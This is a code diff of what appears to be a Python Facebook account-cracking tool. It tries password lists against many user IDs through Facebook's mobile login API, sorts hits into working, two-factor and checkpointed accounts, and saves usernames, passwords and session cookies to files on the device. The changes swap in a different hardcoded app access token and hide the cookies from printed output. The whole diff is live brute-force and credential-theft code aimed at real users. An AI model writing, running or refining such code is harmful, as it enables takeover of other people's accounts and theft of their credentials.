@@ -681,7 +681,7 @@ class crack:
 
     def __free__(self,user,__juts__,_jat):
         global ok,cp,f2,tl
-        sys.stdout.write(f'\r{OO}[CHECKING] {VV}{self.loop}/{len(self.id)} OK:{len(ok)} - 2F:{len(f2)} - CP:{len(cp)}{NN} '),
+        sys.stdout.write(f'\r{OO}[CHECKING] {VV}{self.loop}/{len(self.id)} OK:{len(ok)} '),
         sys.stdout.flush()
         for pw in __juts__:
             try:
@@ -759,13 +759,13 @@ class crack:
                         me=requests.get('https://graph.facebook.com/me?access_token='+tokic, cookies={'cookie':cokie}).json()
                         name=me['name']
                         idd=me['id']
-                        print(f"\r{HH}[OK-GSXD] {used} | {pw} | {cokie}{VV}    ")
+                        print(f"\r{HH}[OK-GSXD] {used} | {pw} {VV}    ")
                         open("/sdcard/GSXD_OK.txt", "a").write(used + "|" + pw + "\n")
                         open("/sdcard/GSXD_cokie.txt", "a").write(used + "|" + pw + " | " + cokie + "\n")
                         ok.append(used + pw)
                         break
                     except KeyError:
-                        print(f"\r\033[1;33m[TL-GSXD] {used} | {pw} {VV}    ")
+                        #print(f"\r\033#[1;33m[TL-GSXD] {used} | {pw} {VV}    ")
                         tl.append(used + pw)
                         break
                 elif "Login approvals are on" in str(q) or "two_factor" in str(q):
@@ -780,7 +780,7 @@ class crack:
                             used=user
                     if len(used)<11 or len(used)>15:
                         used = user
-                    print(f"\r{Mm}[2F-GSXD] {used} | {pw}{VV}     ")
+                    #print(f"\r{M#m}[2F-GSXD] {used} | {pw}{VV}     ")
                     open("/sdcard/GSXD_2F.txt", "a").write(used + "|" + pw + "\n")
                     f2.append(used + pw)
                     break
@@ -814,7 +814,7 @@ class crack:
                         f2.append(used + pw)
                         break
                     else:
-                        print(f"\r{EE}[CP-GSXD] {used} | {pw} {VV}    ")
+                        #print(f"\r{EE}#[CP-GSXD] {used} | {pw} {VV}    ")
                         open("/sdcard/GSXD_CP.txt", "a").write(used + "|" + pw + "\n")
                         cp.append(used + pw)
                         break
@@ -869,7 +869,7 @@ class crack:
                     'fb_api_req_friendly_name':'authenticate',
                     'fb_api_caller_class':'com.facebook.account.login.protocol.Fb4aAuthHandler',
                     'api_key':'882a8490361da98702bf97a021ddc14d',
-                    'access_token':'350685531728|62f8ce9f74b12f84c123cc23437a4a32'
+                    'access_token':'438142079694454|fc0a7caa49b192f64f6f5a6d9643bb28'
                 }
                 head={
                     'x-fb-connection-quality':'EXCELLENT',
@@ -884,7 +884,7 @@ class crack:
                     'x-fb-net-hni':str(random.randint(2e4,4e4)),
                     'x-fb-rmd':'cached=0;state=NO_MATCH',
                     'x-fb-request-analytics-tags':'unknown',
-                    'authorization':'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
+                    'authorization':'OAuth 438142079694454|fc0a7caa49b192f64f6f5a6d9643bb28',
                     'content-type':'application/x-www-form-urlencoded',
                     'x-fb-friendly-name':'authenticate'
                 }
